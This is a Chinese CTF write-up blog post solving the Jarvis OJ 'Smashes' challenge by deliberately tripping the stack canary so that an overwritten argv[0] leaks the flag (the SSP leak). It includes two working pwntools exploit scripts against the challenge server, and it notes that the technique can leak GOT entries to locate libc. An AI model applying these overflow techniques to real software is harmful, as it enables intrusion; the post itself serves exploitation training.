---
title: Jarvis OJ - Smashes の Write-Up
date: 2020-08-06 11:59:32
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Stack
---
## 前言

&emsp;&emsp;Smashes这道题算是一类题型的典型代表，第一次和Canary交手，还好题目比较简单。

<!-- more -->

## Step 1

&emsp;&emsp;首先运行程序：

![](/img/Smashes/Smashes1.png)

&emsp;&emsp;检查一下保护措施：

![](/img/Smashes/Smashes2.png)

&emsp;&emsp;可以看到保护措施还是比较完备的，开启了DEP、Canary和FORTIFY保护。

## Step 2

&emsp;&emsp;将程序丢到hopper中，发现了一个关键的主函数：

![](/img/Smashes/Smashes3.png)

&emsp;&emsp;  可以看到输入name的时候总体的stack大小为296也就是0x128，但是在rbx会放置Canary，大小为0x20。也就是说当我们输入的字符超过0x108就会覆盖Canary值，然后程序就会报错。如下图所示：

![](/img/Smashes/Smashes4.png)

&emsp;&emsp; 而在“Please overwrite the flag: ”后的输入，程序通过_IO_getc(*stdin)接收。但是没有设置范围，只有当遇到‘\n’的时候才会退出循环，继续往下运行。

&emsp;&emsp;程序存在Canary保护，所以常规的栈溢出无法实现。经过大佬提点，可以通过故意触发Canary来实现SSP（Stack Smashing Protector）Leak。

## Step 3

&emsp;&emsp;首先还是要了解一下Stack Smash。当程序有了Canary保护之后，如果我们尝试缓冲区溢出，那么输入的数据会首先覆盖EBP上面的Canary值。而程序运行的时候会将这个值与原来的Canary值做比较，发现不一样就会报错。通常来说不太会注意报错信息，但是Stack Smash方法就是利用打印的报错信息的程序来得到我们想要的内容。看下程序中检查Canary的部分：

![](/img/Smashes/Smashes5.png)

&emsp;&emsp;rax中存放的是程序运行时Canary的值，比较不通过时会调用__stack_chk_fail()函数打印报错信息。找一下__stack_chk_fail()函数的源码：

```C#
void 
__attribute__ ((noreturn)) 
__stack_chk_fail (void) {   
    __fortify_fail ("stack smashing detected"); 
}
```

&emsp;&emsp;再继续看下__fortify_fail()函数：

```C#
void 
__attribute__ ((noreturn)) 
__fortify_fail (msg)
   const char *msg; {
      /* The loop is added only to keep gcc happy. */
         while (1)
              __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>") 
} 
libc_hidden_def (__fortify_fail)
```

&emsp;&emsp;__stack_chk_fail()函数中调用了__fortify_fail()函数，而在__fortify_fail()函数中调用__libc_message()函数输出了msg和__libc_argv[0]。msg就是"stack smashing detected"，__libc_argv[0]其实是argv[0]，也就是程序名。

&emsp;&emsp;在程序执行的时候，argv[0]会放在栈中，利用栈溢出可以将这个值覆盖为我们想要的值。比如某个函数的got表中的值，这样在执行__stack_chk_fail()函数的时候。利用输出报错信息就可以输出想要的got表信息，再加上libc文件偏移就可以获得libc加载的基地址。之后就可以通过基地址进一步利用，获得栈地址及栈中的重要信息。

&emsp;&emsp; 扯远了，这道题里我们想的肯定的直接覆盖为flag的地址，首先来了解一下这个程序里栈的布局：

![](/img/Smashes/Smashes6.png)

&emsp;&emsp;所以这里有种简单的方法，只要我们能够输入足够长的字符串覆盖掉argv[0]，就可以在触发Canary保护的同时输出flag。

&emsp;&emsp;最后一个问题，flag地址在哪里。在hopper中我们分明看到了两个flag地址loc_40084e和loc_400860（在IDA中居然只有一个，以往hopper的伪代码可读性令人头大，这次居然意料之外的压制了IDA），loc_40084e中指向byte [rbx+aPctfheresTheFl]，而loc_400860就指向aPctfheresTheFl：

![](/img/Smashes/Smashes7.png)

&emsp;&emsp;但是我们用0x600d20这个地址无法获得flag，这里会被覆盖，所以需要利用byte [rbx+aPctfheresTheFl]位置的flag地址。把程序断在loc_400860函数，然后在程序中寻找‘PCTF’的字样：

![](/img/Smashes/Smashes8.png)

&emsp;&emsp;我们再看一下0x600d20位置的flag：

![](/img/Smashes/Smashes9.png)

&emsp;&emsp;对照上面我们的输入：

![](/img/Smashes/Smashes10.png)

&emsp;&emsp;发现这个位置的flag会被我们的输入所覆盖，所以选择0x400d20位置的flag。

&emsp;&emsp;于是给出EXP：

```Python
from pwn import *

sh = remote('pwn.jarvisoj.com', 9877)
  
flag_addr = 0x400d20
payload = p64(flag_addr) * 200
  
sh.recv()
sh.sendline(payload)
sh.interactive()
sh.close()
```

&emsp;&emsp;EXP脚本运行结果图：

![](/img/Smashes/Smashes11.png)

## Step 4

&emsp;&emsp;虽然解决了问题，但是觉得这样很是不爽。于是继续找一下具体的offset值。

&emsp;&emsp;把程序断在主函数sub_4007e0，可以看到程序名字也就是argv[0]已经到了栈中：

![](/img/Smashes/Smashes12.png)

&emsp;&emsp;然后再在程序输入名字的位置下个断点：

![](/img/Smashes/Smashes13.png)

&emsp;&emsp;可以看到调用__IO_gets接收输入，接收完之后将程序断下来：

![](/img/Smashes/Smashes14.png)

&emsp;&emsp; 所以输入地址与argv[0]的距离为：0x7ffd531186d8 - 0x7ffd531184c0 = 0x218，也就是需要padding的部分。

&emsp;&emsp;最终第二种方法的EXP脚本：

```Python
from pwn import *

sh = remote('pwn.jarvisoj.com', 9877)
  
flag_addr = 0x400d20
payload = 'a' * 0x218 + p64(flag_addr)
  
sh.recv()
sh.sendline(payload)
sh.interactive()
sh.close()
```

&emsp;&emsp;运行结果图：

![](/img/Smashes/Smashes15.png)
